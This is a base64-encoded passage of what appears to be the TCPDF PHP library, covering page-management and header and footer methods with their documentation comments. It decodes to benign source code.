gZ2V0TnVtUGFnZXMoKQoJICovCglwdWJsaWMgZnVuY3Rpb24gc2V0UGFnZSgkcG51bSwgJHJlc2V0bWFyZ2lucz1mYWxzZSkgewoJCWlmICgoJHBudW0gPT0gJHRoaXMtPnBhZ2UpIEFORCAoJHRoaXMtPnN0YXRlID09IDIpKSB7CgkJCXJldHVybjsKCQl9CgkJaWYgKCgkcG51bSA+IDApIEFORCAoJHBudW0gPD0gJHRoaXMtPm51bXBhZ2VzKSkgewoJCQkkdGhpcy0+c3RhdGUgPSAyOwoJCQkvLyBzYXZlIGN1cnJlbnQgZ3JhcGhpYyBzZXR0aW5ncwoJCQkvLyRndmFycyA9ICR0aGlzLT5nZXRHcmFwaGljVmFycygpOwoJCQkkb2xkcGFnZSA9ICR0aGlzLT5wYWdlOwoJCQkkdGhpcy0+cGFnZSA9ICRwbnVtOwoJCQkkdGhpcy0+d1B0ID0gJHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnBhZ2VdWyd3J107CgkJCSR0aGlzLT5oUHQgPSAkdGhpcy0+cGFnZWRpbVskdGhpcy0+cGFnZV1bJ2gnXTsKCQkJJHRoaXMtPncgPSAkdGhpcy0+cGFnZWRpbVskdGhpcy0+cGFnZV1bJ3drJ107CgkJCSR0aGlzLT5oID0gJHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnBhZ2VdWydoayddOwoJCQkkdGhpcy0+dE1hcmdpbiA9ICR0aGlzLT5wYWdlZGltWyR0aGlzLT5wYWdlXVsndG0nXTsKCQkJJHRoaXMtPmJNYXJnaW4gPSAkdGhpcy0+cGFnZWRpbVskdGhpcy0+cGFnZV1bJ2JtJ107CgkJCSR0aGlzLT5vcmlnaW5hbF9sTWFyZ2luID0gJHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnBhZ2VdWydvbG0nXTsKCQkJJHRoaXMtPm9yaWdpbmFsX3JNYXJnaW4gPSAkdGhpcy0+cGFnZWRpbVskdGhpcy0+cGFnZV1bJ29ybSddOwoJCQkkdGhpcy0+QXV0b1BhZ2VCcmVhayA9ICR0aGlzLT5wYWdlZGltWyR0aGlzLT5wYWdlXVsncGInXTsKCQkJJHRoaXMtPkN1ck9yaWVudGF0aW9uID0gJHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnBhZ2VdWydvciddOwoJCQkkdGhpcy0+c2V0QXV0b1BhZ2VCcmVhaygkdGhpcy0+QXV0b1BhZ2VCcmVhaywgJHRoaXMtPmJNYXJnaW4pOwoJCQkvLyByZXN0b3JlIGdyYXBoaWMgc2V0dGluZ3MKCQkJLy8kdGhpcy0+c2V0R3JhcGhpY1ZhcnMoJGd2YXJzKTsKCQkJaWYgKCRyZXNldG1hcmdpbnMpIHsKCQkJCSR0aGlzLT5sTWFyZ2luID0gJHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnBhZ2VdWydvbG0nXTsKCQkJCSR0aGlzLT5yTWFyZ2luID0gJHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnBhZ2VdWydvcm0nXTsKCQkJCSR0aGlzLT5zZXRZKCR0aGlzLT50TWFyZ2luKTsKCQkJfSBlbHNlIHsKCQkJCS8vIGFjY291bnQgZm9yIGJvb2tsZXQgbW9kZQoJCQkJaWYgKCR0aGlzLT5wYWdlZGltWyR0aGlzLT5wYWdlXVsnb2xtJ10gIT0gJHRoaXMtPnBhZ2VkaW1bJG9sZHBhZ2VdWydvbG0nXSkgewoJCQkJCSRkZWx0YW0gPSAkdGhpcy0+cGFnZWRpbVskdGhpcy0+cGFnZV1bJ29sbSddIC0gJHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnBhZ2VdWydvcm0nXTsKCQkJCQkkdGhpcy0+bE1hcmdpbiArPSAkZGVsdGFtOwoJCQkJCSR0aGlzLT5yTWFyZ2luIC09ICRkZWx0YW07CgkJCQl9CgkJCX0KCQl9IGVsc2UgewoJCQkkdGhpcy0+RXJyb3IoJ1dyb25nIHBhZ2UgbnVtYmVyIG9uIHNldFBhZ2UoKSBmdW5jdGlvbjogJy4kcG51bSk7CgkJfQoJfQoKCS8qKgoJICogUmVzZXQgcG9pbnRlciB0byB0aGUgbGFzdCBkb2N1bWVudCBwYWdlLgoJICogQHBhcmFtIGJvb2xlYW4gJHJlc2V0bWFyZ2lucyBpZiB0cnVlIHJlc2V0IGxlZnQsIHJpZ2h0LCB0b3AgbWFyZ2lucyBhbmQgWSBwb3NpdGlvbi4KCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSAyLjAuMDAwICgyMDA4LTAxLTA0KQoJICogQHNlZSBzZXRQYWdlKCksIGdldFBhZ2UoKSwgZ2V0TnVtUGFnZXMoKQoJICovCglwdWJsaWMgZnVuY3Rpb24gbGFzdFBhZ2UoJHJlc2V0bWFyZ2lucz1mYWxzZSkgewoJCSR0aGlzLT5zZXRQYWdlKCR0aGlzLT5nZXROdW1QYWdlcygpLCAkcmVzZXRtYXJnaW5zKTsKCX0KCgkvKioKCSAqIEdldCBjdXJyZW50IGRvY3VtZW50IHBhZ2UgbnVtYmVyLgoJICogQHJldHVybiBpbnQgcGFnZSBudW1iZXIKCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSAyLjEuMDAwICgyMDA4LTAxLTA3KQoJICogQHNlZSBzZXRQYWdlKCksIGxhc3RwYWdlKCksIGdldE51bVBhZ2VzKCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIGdldFBhZ2UoKSB7CgkJcmV0dXJuICR0aGlzLT5wYWdlOwoJfQoKCS8qKgoJICogR2V0IHRoZSB0b3RhbCBudW1iZXIgb2YgaW5zZXJlZCBwYWdlcy4KCSAqIEByZXR1cm4gaW50IG51bWJlciBvZiBwYWdlcwoJICogQHB1YmxpYwoJICogQHNpbmNlIDIuMS4wMDAgKDIwMDgtMDEtMDcpCgkgKiBAc2VlIHNldFBhZ2UoKSwgZ2V0UGFnZSgpLCBsYXN0cGFnZSgpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBnZXROdW1QYWdlcygpIHsKCQlyZXR1cm4gJHRoaXMtPm51bXBhZ2VzOwoJfQoKCS8qKgoJICogQWRkcyBhIG5ldyBUT0MgKFRhYmxlIE9mIENvbnRlbnQpIHBhZ2UgdG8gdGhlIGRvY3VtZW50LgoJICogQHBhcmFtIHN0cmluZyAkb3JpZW50YXRpb24gcGFnZSBvcmllbnRhdGlvbi4KCSAqIEBwYXJhbSBtaXhlZCAkZm9ybWF0IFRoZSBmb3JtYXQgdXNlZCBmb3IgcGFnZXMuIEl0IGNhbiBiZSBlaXRoZXI6IG9uZSBvZiB0aGUgc3RyaW5nIHZhbHVlcyBzcGVjaWZpZWQgYXQgZ2V0UGFnZVNpemVGcm9tRm9ybWF0KCkgb3IgYW4gYXJyYXkgb2YgcGFyYW1ldGVycyBzcGVjaWZpZWQgYXQgc2V0UGFnZUZvcm1hdCgpLgoJICogQHBhcmFtIGJvb2xlYW4gJGtlZXBtYXJnaW5zIGlmIHRydWUgb3ZlcndyaXRlcyB0aGUgZGVmYXVsdCBwYWdlIG1hcmdpbnMgd2l0aCB0aGUgY3VycmVudCBtYXJnaW5zCgkgKiBAcHVibGljCgkgKiBAc2luY2UgNS4wLjAwMSAoMjAxMC0wNS0wNikKCSAqIEBzZWUgQWRkUGFnZSgpLCBzdGFydFBhZ2UoKSwgZW5kUGFnZSgpLCBlbmRUT0NQYWdlKCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIGFkZFRPQ1BhZ2UoJG9yaWVudGF0aW9uPScnLCAkZm9ybWF0PScnLCAka2VlcG1hcmdpbnM9ZmFsc2UpIHsKCQkkdGhpcy0+QWRkUGFnZSgkb3JpZW50YXRpb24sICRmb3JtYXQsICRrZWVwbWFyZ2lucywgdHJ1ZSk7Cgl9CgoJLyoqCgkgKiBUZXJtaW5hdGUgdGhlIGN1cnJlbnQgVE9DIChUYWJsZSBPZiBDb250ZW50KSBwYWdlCgkgKiBAcHVibGljCgkgKiBAc2luY2UgNS4wLjAwMSAoMjAxMC0wNS0wNikKCSAqIEBzZWUgQWRkUGFnZSgpLCBzdGFydFBhZ2UoKSwgZW5kUGFnZSgpLCBhZGRUT0NQYWdlKCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIGVuZFRPQ1BhZ2UoKSB7CgkJJHRoaXMtPmVuZFBhZ2UodHJ1ZSk7Cgl9CgoJLyoqCgkgKiBBZGRzIGEgbmV3IHBhZ2UgdG8gdGhlIGRvY3VtZW50LiBJZiBhIHBhZ2UgaXMgYWxyZWFkeSBwcmVzZW50LCB0aGUgRm9vdGVyKCkgbWV0aG9kIGlzIGNhbGxlZCBmaXJzdCB0byBvdXRwdXQgdGhlIGZvb3RlciAoaWYgZW5hYmxlZCkuIFRoZW4gdGhlIHBhZ2UgaXMgYWRkZWQsIHRoZSBjdXJyZW50IHBvc2l0aW9uIHNldCB0byB0aGUgdG9wLWxlZnQgY29ybmVyIGFjY29yZGluZyB0byB0aGUgbGVmdCBhbmQgdG9wIG1hcmdpbnMgKG9yIHRvcC1yaWdodCBpZiBpbiBSVEwgbW9kZSksIGFuZCBIZWFkZXIoKSBpcyBjYWxsZWQgdG8gZGlzcGxheSB0aGUgaGVhZGVyIChpZiBlbmFibGVkKS4KCSAqIFRoZSBvcmlnaW4gb2YgdGhlIGNvb3JkaW5hdGUgc3lzdGVtIGlzIGF0IHRoZSB0b3AtbGVmdCBjb3JuZXIgKG9yIHRvcC1yaWdodCBmb3IgUlRMKSBhbmQgaW5jcmVhc2luZyBvcmRpbmF0ZXMgZ28gZG93bndhcmRzLgoJICogQHBhcmFtIHN0cmluZyAkb3JpZW50YXRpb24gcGFnZSBvcmllbnRhdGlvbi4gUG9zc2libGUgdmFsdWVzIGFyZSAoY2FzZSBpbnNlbnNpdGl2ZSk6PHVsPjxsaT5QIG9yIFBPUlRSQUlUIChkZWZhdWx0KTwvbGk+PGxpPkwgb3IgTEFORFNDQVBFPC9saT48L3VsPgoJICogQHBhcmFtIG1peGVkICRmb3JtYXQgVGhlIGZvcm1hdCB1c2VkIGZvciBwYWdlcy4gSXQgY2FuIGJlIGVpdGhlcjogb25lIG9mIHRoZSBzdHJpbmcgdmFsdWVzIHNwZWNpZmllZCBhdCBnZXRQYWdlU2l6ZUZyb21Gb3JtYXQoKSBvciBhbiBhcnJheSBvZiBwYXJhbWV0ZXJzIHNwZWNpZmllZCBhdCBzZXRQYWdlRm9ybWF0KCkuCgkgKiBAcGFyYW0gYm9vbGVhbiAka2VlcG1hcmdpbnMgaWYgdHJ1ZSBvdmVyd3JpdGVzIHRoZSBkZWZhdWx0IHBhZ2UgbWFyZ2lucyB3aXRoIHRoZSBjdXJyZW50IG1hcmdpbnMKCSAqIEBwYXJhbSBib29sZWFuICR0b2NwYWdlIGlmIHRydWUgc2V0IHRoZSB0b2NwYWdlIHN0YXRlIHRvIHRydWUgKHRoZSBhZGRlZCBwYWdlIHdpbGwgYmUgdXNlZCB0byBkaXNwbGF5IFRhYmxlIE9mIENvbnRlbnQpLgoJICogQHB1YmxpYwoJICogQHNpbmNlIDEuMAoJICogQHNlZSBzdGFydFBhZ2UoKSwgZW5kUGFnZSgpLCBhZGRUT0NQYWdlKCksIGVuZFRPQ1BhZ2UoKSwgZ2V0UGFnZVNpemVGcm9tRm9ybWF0KCksIHNldFBhZ2VGb3JtYXQoKQoJICovCglwdWJsaWMgZnVuY3Rpb24gQWRkUGFnZSgkb3JpZW50YXRpb249JycsICRmb3JtYXQ9JycsICRrZWVwbWFyZ2lucz1mYWxzZSwgJHRvY3BhZ2U9ZmFsc2UpIHsKCQlpZiAoJHRoaXMtPmlueG9iaikgewoJCQkvLyB3ZSBhcmUgaW5zaWRlIGFuIFhPYmplY3QgdGVtcGxhdGUKCQkJcmV0dXJuOwoJCX0KCQlpZiAoIWlzc2V0KCR0aGlzLT5vcmlnaW5hbF9sTWFyZ2luKSBPUiAka2VlcG1hcmdpbnMpIHsKCQkJJHRoaXMtPm9yaWdpbmFsX2xNYXJnaW4gPSAkdGhpcy0+bE1hcmdpbjsKCQl9CgkJaWYgKCFpc3NldCgkdGhpcy0+b3JpZ2luYWxfck1hcmdpbikgT1IgJGtlZXBtYXJnaW5zKSB7CgkJCSR0aGlzLT5vcmlnaW5hbF9yTWFyZ2luID0gJHRoaXMtPnJNYXJnaW47CgkJfQoJCS8vIHRlcm1pbmF0ZSBwcmV2aW91cyBwYWdlCgkJJHRoaXMtPmVuZFBhZ2UoKTsKCQkvLyBzdGFydCBuZXcgcGFnZQoJCSR0aGlzLT5zdGFydFBhZ2UoJG9yaWVudGF0aW9uLCAkZm9ybWF0LCAkdG9jcGFnZSk7Cgl9CgoJLyoqCgkgKiBUZXJtaW5hdGUgdGhlIGN1cnJlbnQgcGFnZQoJICogQHBhcmFtIGJvb2xlYW4gJHRvY3BhZ2UgaWYgdHJ1ZSBzZXQgdGhlIHRvY3BhZ2Ugc3RhdGUgdG8gZmFsc2UgKGVuZCB0aGUgcGFnZSB1c2VkIHRvIGRpc3BsYXkgVGFibGUgT2YgQ29udGVudCkuCgkgKiBAcHVibGljCgkgKiBAc2luY2UgNC4yLjAxMCAoMjAwOC0xMS0xNCkKCSAqIEBzZWUgQWRkUGFnZSgpLCBzdGFydFBhZ2UoKSwgYWRkVE9DUGFnZSgpLCBlbmRUT0NQYWdlKCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIGVuZFBhZ2UoJHRvY3BhZ2U9ZmFsc2UpIHsKCQkvLyBjaGVjayBpZiBwYWdlIGlzIGFscmVhZHkgY2xvc2VkCgkJaWYgKCgkdGhpcy0+cGFnZSA9PSAwKSBPUiAoJHRoaXMtPm51bXBhZ2VzID4gJHRoaXMtPnBhZ2UpIE9SICghJHRoaXMtPnBhZ2VvcGVuWyR0aGlzLT5wYWdlXSkpIHsKCQkJcmV0dXJuOwoJCX0KCQkvLyBwcmludCBwYWdlIGZvb3RlcgoJCSR0aGlzLT5zZXRGb290ZXIoKTsKCQkvLyBjbG9zZSBwYWdlCgkJJHRoaXMtPl9lbmRwYWdlKCk7CgkJLy8gbWFyayBwYWdlIGFzIGNsb3NlZAoJCSR0aGlzLT5wYWdlb3BlblskdGhpcy0+cGFnZV0gPSBmYWxzZTsKCQlpZiAoJHRvY3BhZ2UpIHsKCQkJJHRoaXMtPnRvY3BhZ2UgPSBmYWxzZTsKCQl9Cgl9CgoJLyoqCgkgKiBTdGFydHMgYSBuZXcgcGFnZSB0byB0aGUgZG9jdW1lbnQuIFRoZSBwYWdlIG11c3QgYmUgY2xvc2VkIHVzaW5nIHRoZSBlbmRQYWdlKCkgZnVuY3Rpb24uCgkgKiBUaGUgb3JpZ2luIG9mIHRoZSBjb29yZGluYXRlIHN5c3RlbSBpcyBhdCB0aGUgdG9wLWxlZnQgY29ybmVyIGFuZCBpbmNyZWFzaW5nIG9yZGluYXRlcyBnbyBkb3dud2FyZHMuCgkgKiBAcGFyYW0gc3RyaW5nICRvcmllbnRhdGlvbiBwYWdlIG9yaWVudGF0aW9uLiBQb3NzaWJsZSB2YWx1ZXMgYXJlIChjYXNlIGluc2Vuc2l0aXZlKTo8dWw+PGxpPlAgb3IgUE9SVFJBSVQgKGRlZmF1bHQpPC9saT48bGk+TCBvciBMQU5EU0NBUEU8L2xpPjwvdWw+CgkgKiBAcGFyYW0gbWl4ZWQgJGZvcm1hdCBUaGUgZm9ybWF0IHVzZWQgZm9yIHBhZ2VzLiBJdCBjYW4gYmUgZWl0aGVyOiBvbmUgb2YgdGhlIHN0cmluZyB2YWx1ZXMgc3BlY2lmaWVkIGF0IGdldFBhZ2VTaXplRnJvbUZvcm1hdCgpIG9yIGFuIGFycmF5IG9mIHBhcmFtZXRlcnMgc3BlY2lmaWVkIGF0IHNldFBhZ2VGb3JtYXQoKS4KCSAqIEBwYXJhbSBib29sZWFuICR0b2NwYWdlIGlmIHRydWUgdGhlIHBhZ2UgaXMgZGVzaWduYXRlZCB0byBjb250YWluIHRoZSBUYWJsZS1PZi1Db250ZW50LgoJICogQHNpbmNlIDQuMi4wMTAgKDIwMDgtMTEtMTQpCgkgKiBAc2VlIEFkZFBhZ2UoKSwgZW5kUGFnZSgpLCBhZGRUT0NQYWdlKCksIGVuZFRPQ1BhZ2UoKSwgZ2V0UGFnZVNpemVGcm9tRm9ybWF0KCksIHNldFBhZ2VGb3JtYXQoKQoJICogQHB1YmxpYwoJICovCglwdWJsaWMgZnVuY3Rpb24gc3RhcnRQYWdlKCRvcmllbnRhdGlvbj0nJywgJGZvcm1hdD0nJywgJHRvY3BhZ2U9ZmFsc2UpIHsKCQlpZiAoJHRvY3BhZ2UpIHsKCQkJJHRoaXMtPnRvY3BhZ2UgPSB0cnVlOwoJCX0KCQkvLyBtb3ZlIHBhZ2UgbnVtYmVycyBvZiBkb2N1bWVudHMgdG8gYmUgYXR0YWNoZWQKCQlpZiAoJHRoaXMtPnRvY3BhZ2UpIHsKCQkJLy8gbW92ZSByZWZlcmVuY2UgdG8gdW5leGlzdGVudCBwYWdlcyAodXNlZCBmb3IgcGFnZSBhdHRhY2htZW50cykKCQkJLy8gYWRqdXN0IG91dGxpbmVzCgkJCSR0bXBvdXRsaW5lcyA9ICR0aGlzLT5vdXRsaW5lczsKCQkJZm9yZWFjaCAoJHRtcG91dGxpbmVzIGFzICRrZXkgPT4gJG91dGxpbmUpIHsKCQkJCWlmICghJG91dGxpbmVbJ2YnXSBBTkQgKCRvdXRsaW5lWydwJ10gPiAkdGhpcy0+bnVtcGFnZXMpKSB7CgkJCQkJJHRoaXMtPm91dGxpbmVzWyRrZXldWydwJ10gPSAoJG91dGxpbmVbJ3AnXSArIDEpOwoJCQkJfQoJCQl9CgkJCS8vIGFkanVzdCBkZXN0cwoJCQkkdG1wZGVzdHMgPSAkdGhpcy0+ZGVzdHM7CgkJCWZvcmVhY2ggKCR0bXBkZXN0cyBhcyAka2V5ID0+ICRkZXN0KSB7CgkJCQlpZiAoISRkZXN0WydmJ10gQU5EICgkZGVzdFsncCddID4gJHRoaXMtPm51bXBhZ2VzKSkgewoJCQkJCSR0aGlzLT5kZXN0c1ska2V5XVsncCddID0gKCRkZXN0WydwJ10gKyAxKTsKCQkJCX0KCQkJfQoJCQkvLyBhZGp1c3QgbGlua3MKCQkJJHRtcGxpbmtzID0gJHRoaXMtPmxpbmtzOwoJCQlmb3JlYWNoICgkdG1wbGlua3MgYXMgJGtleSA9PiAkbGluaykgewoJCQkJaWYgKCEkbGlua1snZiddIEFORCAoJGxpbmtbJ3AnXSA+ICR0aGlzLT5udW1wYWdlcykpIHsKCQkJCQkkdGhpcy0+bGlua3NbJGtleV1bJ3AnXSA9ICgkbGlua1sncCddICsgMSk7CgkJCQl9CgkJCX0KCQl9CgkJaWYgKCR0aGlzLT5udW1wYWdlcyA+ICR0aGlzLT5wYWdlKSB7CgkJCS8vIHRoaXMgcGFnZSBoYXMgYmVlbiBhbHJlYWR5IGFkZGVkCgkJCSR0aGlzLT5zZXRQYWdlKCR0aGlzLT5wYWdlICsgMSk7CgkJCSR0aGlzLT5zZXRZKCR0aGlzLT50TWFyZ2luKTsKCQkJcmV0dXJuOwoJCX0KCQkvLyBzdGFydCBhIG5ldyBwYWdlCgkJaWYgKCR0aGlzLT5zdGF0ZSA9PSAwKSB7CgkJCSR0aGlzLT5PcGVuKCk7CgkJfQoJCSsrJHRoaXMtPm51bXBhZ2VzOwoJCSR0aGlzLT5zd2FwTWFyZ2lucygkdGhpcy0+Ym9va2xldCk7CgkJLy8gc2F2ZSBjdXJyZW50IGdyYXBoaWMgc2V0dGluZ3MKCQkkZ3ZhcnMgPSAkdGhpcy0+Z2V0R3JhcGhpY1ZhcnMoKTsKCQkvLyBzdGFydCBuZXcgcGFnZQoJCSR0aGlzLT5fYmVnaW5wYWdlKCRvcmllbnRhdGlvbiwgJGZvcm1hdCk7CgkJLy8gbWFyayBwYWdlIGFzIG9wZW4KCQkkdGhpcy0+cGFnZW9wZW5bJHRoaXMtPnBhZ2VdID0gdHJ1ZTsKCQkvLyByZXN0b3JlIGdyYXBoaWMgc2V0dGluZ3MKCQkkdGhpcy0+c2V0R3JhcGhpY1ZhcnMoJGd2YXJzKTsKCQkvLyBtYXJrIHRoaXMgcG9pbnQKCQkkdGhpcy0+c2V0UGFnZU1hcmsoKTsKCQkvLyBwcmludCBwYWdlIGhlYWRlcgoJCSR0aGlzLT5zZXRIZWFkZXIoKTsKCQkvLyByZXN0b3JlIGdyYXBoaWMgc2V0dGluZ3MKCQkkdGhpcy0+c2V0R3JhcGhpY1ZhcnMoJGd2YXJzKTsKCQkvLyBtYXJrIHRoaXMgcG9pbnQKCQkkdGhpcy0+c2V0UGFnZU1hcmsoKTsKCQkvLyBwcmludCB0YWJsZSBoZWFkZXIgKGlmIGFueSkKCQkkdGhpcy0+c2V0VGFibGVIZWFkZXIoKTsKCQkvLyBzZXQgbWFyayBmb3IgZW1wdHkgcGFnZSBjaGVjawoJCSR0aGlzLT5lbXB0eXBhZ2VtcmtbJHRoaXMtPnBhZ2VdPSAkdGhpcy0+cGFnZWxlblskdGhpcy0+cGFnZV07Cgl9CgoJLyoqCgkgKiBTZXQgc3RhcnQtd3JpdGluZyBtYXJrIG9uIGN1cnJlbnQgcGFnZSBzdHJlYW0gdXNlZCB0byBwdXQgYm9yZGVycyBhbmQgZmlsbHMuCgkgKiBCb3JkZXJzIGFuZCBmaWxscyBhcmUgYWx3YXlzIGNyZWF0ZWQgYWZ0ZXIgY29udGVudCBhbmQgaW5zZXJ0ZWQgb24gdGhlIHBvc2l0aW9uIG1hcmtlZCBieSB0aGlzIG1ldGhvZC4KCSAqIFRoaXMgZnVuY3Rpb24gbXVzdCBiZSBjYWxsZWQgYWZ0ZXIgY2FsbGluZyBJbWFnZSgpIGZ1bmN0aW9uIGZvciBhIGJhY2tncm91bmQgaW1hZ2UuCgkgKiBCYWNrZ3JvdW5kIGltYWdlcyBtdXN0IGJlIGFsd2F5cyBpbnNlcnRlZCBiZWZvcmUgY2FsbGluZyBNdWx0aWNlbGwoKSBvciBXcml0ZUhUTUxDZWxsKCkgb3IgV3JpdGVIVE1MKCkgZnVuY3Rpb25zLgoJICogQHB1YmxpYwoJICogQHNpbmNlIDQuMC4wMTYgKDIwMDgtMDctMzApCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBzZXRQYWdlTWFyaygpIHsKCQkkdGhpcy0+aW50bXJrWyR0aGlzLT5wYWdlXSA9ICR0aGlzLT5wYWdlbGVuWyR0aGlzLT5wYWdlXTsKCQkkdGhpcy0+Ym9yZGVybXJrWyR0aGlzLT5wYWdlXSA9ICR0aGlzLT5pbnRtcmtbJHRoaXMtPnBhZ2VdOwoJCSR0aGlzLT5zZXRDb250ZW50TWFyaygpOwoJfQoKCS8qKgoJICogU2V0IHN0YXJ0LXdyaXRpbmcgbWFyayBvbiBzZWxlY3RlZCBwYWdlLgoJICogQm9yZGVycyBhbmQgZmlsbHMgYXJlIGFsd2F5cyBjcmVhdGVkIGFmdGVyIGNvbnRlbnQgYW5kIGluc2VydGVkIG9uIHRoZSBwb3NpdGlvbiBtYXJrZWQgYnkgdGhpcyBtZXRob2QuCgkgKiBAcGFyYW0gaW50ICRwYWdlIHBhZ2UgbnVtYmVyIChkZWZhdWx0IGlzIHRoZSBjdXJyZW50IHBhZ2UpCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNC42LjAyMSAoMjAwOS0wNy0yMCkKCSAqLwoJcHJvdGVjdGVkIGZ1bmN0aW9uIHNldENvbnRlbnRNYXJrKCRwYWdlPTApIHsKCQlpZiAoJHBhZ2UgPD0gMCkgewoJCQkkcGFnZSA9ICR0aGlzLT5wYWdlOwoJCX0KCQlpZiAoaXNzZXQoJHRoaXMtPmZvb3RlcmxlblskcGFnZV0pKSB7CgkJCSR0aGlzLT5jbnRtcmtbJHBhZ2VdID0gJHRoaXMtPnBhZ2VsZW5bJHBhZ2VdIC0gJHRoaXMtPmZvb3RlcmxlblskcGFnZV07CgkJfSBlbHNlIHsKCQkJJHRoaXMtPmNudG1ya1skcGFnZV0gPSAkdGhpcy0+cGFnZWxlblskcGFnZV07CgkJfQoJfQoKCS8qKgoJICogU2V0IGhlYWRlciBkYXRhLgoJICogQHBhcmFtIHN0cmluZyAkbG4gaGVhZGVyIGltYWdlIGxvZ28KCSAqIEBwYXJhbSBpbnQgJGx3IGhlYWRlciBpbWFnZSBsb2dvIHdpZHRoIGluIG1tCgkgKiBAcGFyYW0gc3RyaW5nICRodCBzdHJpbmcgdG8gcHJpbnQgYXMgdGl0bGUgb24gZG9jdW1lbnQgaGVhZGVyCgkgKiBAcGFyYW0gc3RyaW5nICRocyBzdHJpbmcgdG8gcHJpbnQgb24gZG9jdW1lbnQgaGVhZGVyCgkgKiBAcGFyYW0gaW50W10gJHRjIFJHQiBhcnJheSBjb2xvciBmb3IgdGV4dC4KCSAqIEBwYXJhbSBpbnRbXSAkbGMgUkdCIGFycmF5IGNvbG9yIGZvciBsaW5lLgoJICogQHB1YmxpYwoJICovCglwdWJsaWMgZnVuY3Rpb24gc2V0SGVhZGVyRGF0YSgkbG49JycsICRsdz0wLCAkaHQ9JycsICRocz0nJywgJHRjPWFycmF5KDAsMCwwKSwgJGxjPWFycmF5KDAsMCwwKSkgewoJCSR0aGlzLT5oZWFkZXJfbG9nbyA9ICRsbjsKCQkkdGhpcy0+aGVhZGVyX2xvZ29fd2lkdGggPSAkbHc7CgkJJHRoaXMtPmhlYWRlcl90aXRsZSA9ICRodDsKCQkkdGhpcy0+aGVhZGVyX3N0cmluZyA9ICRoczsKCQkkdGhpcy0+aGVhZGVyX3RleHRfY29sb3IgPSAkdGM7CgkJJHRoaXMtPmhlYWRlcl9saW5lX2NvbG9yID0gJGxjOwoJfQoKCS8qKgoJICogU2V0IGZvb3RlciBkYXRhLgoJICogQHBhcmFtIGludFtdICR0YyBSR0IgYXJyYXkgY29sb3IgZm9yIHRleHQuCgkgKiBAcGFyYW0gaW50W10gJGxjIFJHQiBhcnJheSBjb2xvciBmb3IgbGluZS4KCSAqIEBwdWJsaWMKCSAqLwoJcHVibGljIGZ1bmN0aW9uIHNldEZvb3RlckRhdGEoJHRjPWFycmF5KDAsMCwwKSwgJGxjPWFycmF5KDAsMCwwKSkgewoJCSR0aGlzLT5mb290ZXJfdGV4dF9jb2xvciA9ICR0YzsKCQkkdGhpcy0+Zm9vdGVyX2xpbmVfY29sb3IgPSAkbGM7Cgl9CgoJLyoqCgkgKiBSZXR1cm5zIGhlYWRlciBkYXRhOgoJICogPHVsPjxsaT4kcmV0Wydsb2dvJ10gPSBsb2dvIGltYWdlPC9saT48bGk+JHJldFsnbG9nb193aWR0aCddID0gd2lkdGggb2YgdGhlIGltYWdlIGxvZ28gaW4gdXNlciB1bml0czwvbGk+PGxpPiRyZXRbJ3RpdGxlJ10gPSBoZWFkZXIgdGl0bGU8L2xpPjxsaT4kcmV0WydzdHJpbmcnXSA9IGhlYWRlciBkZXNjcmlwdGlvbiBzdHJpbmc8L2xpPjwvdWw+CgkgKiBAcmV0dXJuIGFycmF5PHN0cmluZyxtaXhlZD4KCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSA0LjAuMDEyICgyMDA4LTA3LTI0KQoJICovCglwdWJsaWMgZnVuY3Rpb24gZ2V0SGVhZGVyRGF0YSgpIHsKCQkkcmV0ID0gYXJyYXkoKTsKCQkkcmV0Wydsb2dvJ10gPSAkdGhpcy0+aGVhZGVyX2xvZ287CgkJJHJldFsnbG9nb193aWR0aCddID0gJHRoaXMtPmhlYWRlcl9sb2dvX3dpZHRoOwoJCSRyZXRbJ3RpdGxlJ10gPSAkdGhpcy0+aGVhZGVyX3RpdGxlOwoJCSRyZXRbJ3N0cmluZyddID0gJHRoaXMtPmhlYWRlcl9zdHJpbmc7CgkJJHJldFsndGV4dF9jb2xvciddID0gJHRoaXMtPmhlYWRlcl90ZXh0X2NvbG9yOwoJCSRyZXRbJ2xpbmVfY29sb3InXSA9ICR0aGlzLT5oZWFkZXJfbGluZV9jb2xvcjsKCQlyZXR1cm4gJHJldDsKCX0KCgkvKioKCSAqIFNldCBoZWFkZXIgbWFyZ2luLgoJICogKG1pbmltdW0gZGlzdGFuY2UgYmV0d2VlbiBoZWFkZXIgYW5kIHRvcCBwYWdlIG1hcmdpbikKCSAqIEBwYXJhbSBmbG9hdCAkaG0gZGlzdGFuY2UgaW4gdXNlciB1bml0cwoJICogQHB1YmxpYwoJICovCglwdWJsaWMgZnVuY3Rpb24gc2V0SGVhZGVyTWFyZ2luKCRobT0xMCkgewoJCSR0aGlzLT5oZWFkZXJfbWFyZ2luID0gJGhtOwoJfQoKCS8qKgoJICogUmV0dXJucyBoZWFkZXIgbWFyZ2luIGluIHVzZXIgdW5pdHMuCgkgKiBAcmV0dXJuIGZsb2F0CgkgKiBAc2luY2UgNC4wLjAxMiAoMjAwOC0wNy0yNCkKCSAqIEBwdWJsaWMKCSAqLwoJcHVibGljIGZ1bmN0aW9uIGdldEhlYWRlck1hcmdpbigpIHsKCQlyZXR1cm4gJHRoaXMtPmhlYWRlcl9tYXJnaW47Cgl9CgoJLyoqCgkgKiBTZXQgZm9vdGVyIG1hcmdpbi4KCSAqIChtaW5pbXVtIGRpc3RhbmNlIGJldHdlZW4gZm9vdGVyIGFuZCBib3R0b20gcGFnZSBtYXJnaW4pCgkgKiBAcGFyYW0gZmxvYXQgJGZtIGRpc3RhbmNlIGluIHVzZXIgdW5pdHMKCSAqIEBwdWJsaWMKCSAqLwoJcHVibGljIGZ1bmN0aW9uIHNldEZvb3Rlck1hcmdpbigkZm09MTApIHsKCQkkdGhpcy0+Zm9vdGVyX21hcmd